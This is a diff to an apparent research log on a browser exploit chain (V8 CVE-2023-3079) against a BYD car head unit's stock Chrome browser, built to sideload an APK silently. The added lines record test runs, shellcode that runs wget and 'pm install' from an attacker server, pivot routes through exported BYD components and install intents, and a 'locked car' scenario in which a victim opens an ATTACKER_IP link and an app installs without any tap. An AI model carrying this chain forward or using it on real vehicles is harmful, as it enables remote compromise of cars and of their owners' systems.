@@ -579,8 +579,8 @@ For stock units, USB `Third Party Apps` folder is the official method. The blob 
 - dl/blob tests: work as fallback
 
 **Blockers:**
-- p1/p2 flakey (hole+leak_stuff) even with 10/3 tries — many visits never reach p3/p4/early hijack
-- When about_to_call fires (hijack), no marker/pkg yet (now using real JIT X page overwrite via sb_write to real_ep for exec mem; previous RW buf lacked X). Sc child still not producing side effect in tests.
+- p1/p2 still flakey (hole very rare even with 50 attempts + extra prep + fresh slow 'the' + gc). Many visits never reach early hijack.
+- When real_ep reached, post-real_ep beacons (after_real_ep_report, direct_written, written) often missing and no marker/pkg (write may throw or beacon fails after; or payload child not succeeding open/write or pm in the entry context).
 - No recent chain success (p2 fail -> fallback)
 
 **Current (locked-car vector):** am start real 192.168.1.21:8080 (or victim taps) serves html+cb v8.js; p1 hole, p2 addr, p3 arb sb shift=24, p4 wasm, sb plant sc buf, mod5 to get importFn, real_ep from its Code, sb_write(real_ep, sc) to X page (with try/catch + "after_real_ep_report" beacon for diag), about_to, call. p1 (30+gc)/p2 (5+inner) strengthened. Full sc uses mkdir + printf > marker (tmp+sdcard) + wget+pm. Direct minimal test sc in shellcode.py (stderr + open/write). Injection (real_ep + early_sc_buf) confirmed on good p1/p2 loads, but "after" / "written" beacons often missing and no marker (p1/p2 flake main gate; when reached, write or beacon after real_ep may fail or payload child not succeeding the marker write).
@@ -607,6 +607,27 @@ The `tools/browser-exploit/` directory contains test tools from this research:
 - `chain_test_runner.py` — CDP-based automated test runner for install chain vectors
 - `pivot_test.py` — tests file:// origin pivot for privilege escalation
 - `sideload-test.apk` — minimal signed APK (com.test.sideloadtest, targetSdk 29, 8.5KB) for install chain testing
+- `testpm.apk` — dedicated temp copy for pm install verification in sc/blob tests
+- `autopm.html` — auto blob(/payload) + a.download + intent VIEW file:///sdcard/Download/testpm.apk (alt path test)
+
+**Sustained testing results (Jun 2026, remote via adb am start + prior manual opens):**
+- URL tested on car: http://192.168.1.21:8080/ and /autopm.html (via `adb shell am start -a VIEW -d 'http://192.168.1.21:8080/?t=TS'` + would be manual open in native browser for locked). Page loads, reports received (script_top, p1 attempts), confirms vector reachable.
+- Temp APK: testpm.apk created (cp of sideload-test), used as --apk in server (bakes wget /payload.apk -> /data/local/tmp/testpm.apk + pm install -r -t in sc; also for blob tests).
+- V8 (CVE-2023-3079): 5+ cycles, 100-200 p1 attempts each (3k prep, 3 hole variants incl strict args, large_arr recreate, gc every 3/8, fresh the each iter). 0 hits. All p1 "type=undefined undef=true", chain "fail N TheHole failed". No real_ep, no after_real_ep_report, no direct_written, no sc written, no markers (NO_tmp/NO_sd), no testpm pkg. Even with dup p1 removed, MAX_RETRIES=100, top beacon, Code ep redirect+target append, early sb plant, full sc (wget+pm+markers both paths), DIRECT first. Hole creation too rare on this Chrome 113 arm64 DiLink for "open link, leave open" (auto reload helps but not enough in observed time).
+- Download bypass: confirmed BYD block (docs + toast). Blob+<a download> from /autopm.html and autodownload.html loads: no testpm.apk or new *.apk landed in /sdcard/Download (or find /sdcard). Alt path also not producing file in this run (perhaps renderer fs restrictions, path /storage/emulated/0/Download, or needs gesture/setting). Matches user note: native download removed, hence RCE/sc mandatory for reliable auto sideload on locked.
+- Server: jailbreak_server.py updated (no TAP button, red note "Stock browser download disabled by BYD... V8 RCE + native sc is the auto path..."), serves /payload with apk mime from testpm, bakes real 192.168.1.21 + current sc.
+- No clear success after sustained. V8 p1 gate not passed.
+
+**Pivot / other paths (if V8 stays rare):**
+- AftermarketInstallTool (com.byd.aftermarketinstalltool): exported MainActivity + UsbBroadcastReceiver. For BR (countrycode 55) no pw, all APKs allowed. If blob can land APK in "Third Party Apps 55/" watched dir (or trigger scan via intent), may auto or one-tap install without full V8.
+- PackageInstaller intents (confirmed in recon: can launch com.android.packageinstaller/.InstallStart from web via intent: URL). Drop file + VIEW/INSTALL_PACKAGE intent from JS may pop dialog (user confirm) or drive silent in some cases.
+- Other Chromium 113 arm64 CVEs (recon probed 4863 webp, 3420, etc). Or partial arb from failed p1 to write apk bytes + post escape JS to drive install.
+- Manual USB "Third Party Apps {code}" folder (no root) as last resort.
+- Future: if p1 hit rate 0, consider dedicated hammer worker (setInterval gc+leak attempts) or switch to raw_code_exec path if RX pages writable in this build.
+
+**Locked car end-to-end (when success):**
+User (or attacker link): open http://ATTACKER_IP:8080/ in stock browser, leave tab open (auto 100 retries + reload). On good p1: chain runs, sc plants to real JIT X page, child sh does wget testpm.apk + pm install -r -t, markers SC_EXEC_OK land, pkg appears. No tap, no ADB on victim. (Currently blocked on p1 rarity + download block.)
+
 - `pwa.html` — PWA install test page
 - `manifest.json` — PWA manifest
 - `sw.js` — service worker for cache API and PWA
